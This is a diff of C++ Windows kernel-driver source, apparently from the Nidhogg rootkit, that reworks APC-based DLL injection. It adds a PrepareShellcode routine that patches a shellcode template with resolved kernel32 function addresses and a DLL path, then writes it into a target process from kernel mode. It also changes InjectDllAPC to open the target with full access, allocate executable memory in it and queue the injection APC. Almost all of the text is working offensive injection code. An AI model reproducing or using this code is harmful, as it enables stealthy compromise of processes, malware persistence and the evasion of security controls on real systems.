@@ -4,7 +4,6 @@
 #include "ProcessUtils.hpp"
 #include "MemoryAllocator.hpp"
 #include "MemoryHelper.hpp"
-#include "InjectionShellcode.hpp"
 
 MemoryUtils::MemoryUtils() {
 	this->hiddenDrivers.Count = 0;
@@ -58,6 +57,47 @@ MemoryUtils::~MemoryUtils() {
 
 /*
 * Description:
+* PrepareShellcode is responsible for preparing the shellcode to be injected into the target process.
+*
+* Parameters:
+* @dllPath			-- The name of the DLL to be injected.
+* @shellcodeAddress	-- The address of the allocated shellcode in the remote process.
+* @targetProcess	-- The target process to inject the shellcode into.
+* @pid				-- The process ID of the target process.
+*
+* Returns:
+* @status  [NTSTATUS]		 -- Whether successfuly created the shellcode or not.
+*/
+NTSTATUS MemoryUtils::PrepareShellcode(char* dllPath, PVOID shellcodeAddress, PEPROCESS targetProcess, ULONG pid) {
+	SIZE_T shellcodeSize = SHELLCODE_SIZE;
+	NTSTATUS status = STATUS_SUCCESS;
+	UCHAR newShellcode[SHELLCODE_SIZE] = { 0 };
+
+	PVOID pGetProcAddress = NidhoggMemoryUtils->GetFuncAddress("GetProcAddress", L"\\Windows\\System32\\kernel32.dll", pid);
+	PVOID pGetModuleHandle = NidhoggMemoryUtils->GetFuncAddress("GetModuleHandleA", L"\\Windows\\System32\\kernel32.dll", pid);
+
+	if (!dllPath || !pGetProcAddress || !pGetModuleHandle || !shellcodeAddress)
+		return STATUS_INVALID_PARAMETER;
+
+	memcpy(newShellcode, shellcodeTemplate, SHELLCODE_SIZE);
+	memcpy(newShellcode + GET_MODULE_HANDLE_OFFSET, &pGetModuleHandle, sizeof(pGetModuleHandle));
+	memcpy(newShellcode + GET_PROC_ADDRESS_OFFSET, &pGetProcAddress, sizeof(pGetProcAddress));
+	memcpy(newShellcode + DLL_NAME_OFFSET, dllPath, strlen(dllPath) + 1);
+
+	status = NidhoggMemoryUtils->KeWriteProcessMemory(&newShellcode, targetProcess, shellcodeAddress,
+		shellcodeSize, KernelMode);
+
+	if (!NT_SUCCESS(status))
+		return status;
+	shellcodeSize = SHELLCODE_SIZE;
+	PVOID addr = (char*)shellcodeAddress + DLL_NAME_OFFSET;
+	status = NidhoggMemoryUtils->KeWriteProcessMemory(&addr, targetProcess,
+		(char*)shellcodeAddress + SHELLCODE_ADDRESS_OFFSET, sizeof(PVOID), KernelMode, false);
+	return status;
+}
+
+/*
+* Description:
 * InjectDllAPC is responsible to inject a dll in a certain usermode process with APC.
 *
 * Parameters:
@@ -67,26 +107,57 @@ MemoryUtils::~MemoryUtils() {
 * @status  [NTSTATUS]		 -- Whether successfuly injected or not.
 */
 NTSTATUS MemoryUtils::InjectDllAPC(DllInformation* DllInfo) {
+	OBJECT_ATTRIBUTES objAttr{};
+	CLIENT_ID cid{};
+	HANDLE hProcess = NULL;
 	ShellcodeInformation ShellcodeInfo{};
-	PVOID shellcode = NULL;
-
-	NTSTATUS status = PrepareShellcode(DllInfo->DllPath, &shellcode, DllInfo->Pid);
+	PEPROCESS targetProcess = NULL;
+	PVOID shellcodeAddress = NULL;
+	SIZE_T shellcodeSize = SHELLCODE_SIZE;
+	HANDLE pid = UlongToHandle(DllInfo->Pid);
+	NTSTATUS status = PsLookupProcessByProcessId(pid, &targetProcess);
 
 	if (!NT_SUCCESS(status))
 		return status;
+
+	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+	cid.UniqueProcess = pid;
+	cid.UniqueThread = NULL;
+
+	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
+
+	if (!NT_SUCCESS(status)) {
+		ObDereferenceObject(targetProcess);
+		return status;
+	}
+
+	status = ZwAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+
+	if (!NT_SUCCESS(status)) {
+		ZwClose(hProcess);
+		ObDereferenceObject(targetProcess);
+		return status;
+	}
+
+	status = PrepareShellcode(DllInfo->DllPath, shellcodeAddress, targetProcess, DllInfo->Pid);
+	ObDereferenceObject(targetProcess);
+
+	if (!NT_SUCCESS(status)) {
+		ZwFreeVirtualMemory(hProcess, &shellcodeAddress, &shellcodeSize, MEM_DECOMMIT);
+		ZwClose(hProcess);
+		return status;
+	}
+	ZwClose(hProcess);
 
 	// Creating the shellcode information for APC injection.
 	ShellcodeInfo.Parameter1 = NULL;
 	ShellcodeInfo.Parameter2 = NULL;
 	ShellcodeInfo.Parameter3 = NULL;
 	ShellcodeInfo.Pid = DllInfo->Pid;
-	ShellcodeInfo.Shellcode = shellcode;
+	ShellcodeInfo.Shellcode = shellcodeAddress;
 	ShellcodeInfo.ShellcodeSize = SHELLCODE_SIZE;
 
-	status = InjectShellcodeAPC(&ShellcodeInfo, true);
-	SIZE_T shellcodeSize = SHELLCODE_SIZE;
-	ZwFreeVirtualMemory(ZwCurrentProcess(), &shellcode, &shellcodeSize, MEM_DECOMMIT);
-	return status;
+	return InjectShellcodeAPC(&ShellcodeInfo, true);
 }
 
 /*
@@ -187,11 +258,12 @@ NTSTATUS MemoryUtils::InjectDllThread(DllInformation* DllInfo) {
 *
 * Parameters:
 * @ShellcodeInfo [ShellcodeInformation*] -- All the information regarding the injected shellcode.
+* @isInjectedDll [bool]					 -- Whether the shellcode is injected from InjectDllAPC or not.
 *
 * Returns:
 * @status		 [NTSTATUS]				 -- Whether successfuly injected or not.
 */
-NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo, bool injectedDll) {
+NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo, bool isInjectedDll) {
 	OBJECT_ATTRIBUTES objAttr{};
 	CLIENT_ID cid{};
 	HANDLE hProcess = NULL;
@@ -232,23 +304,19 @@ NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo, bo
 		if (!NT_SUCCESS(status))
 			break;
 
-		status = ZwAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+		if (!isInjectedDll) {
+			status = ZwAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
 
-		if (!NT_SUCCESS(status))
-			break;
-		shellcodeSize = ShellcodeInfo->ShellcodeSize;
-
-		status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, shellcodeAddress, shellcodeSize, UserMode);
-
-		if (!NT_SUCCESS(status))
-			break;
-
-		if (injectedDll) {
-			status = FixShellcode(shellcodeAddress, TargetProcess);
+			if (!NT_SUCCESS(status))
+				break;
+			shellcodeSize = ShellcodeInfo->ShellcodeSize;
+			status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, shellcodeAddress, shellcodeSize, UserMode);
 
 			if (!NT_SUCCESS(status))
 				break;
 		}
+		else
+			shellcodeAddress = ShellcodeInfo->Shellcode;
 
 		// Create and execute the APCs.
 		ShellcodeApc = (PKAPC)AllocateMemory(sizeof(KAPC), false);
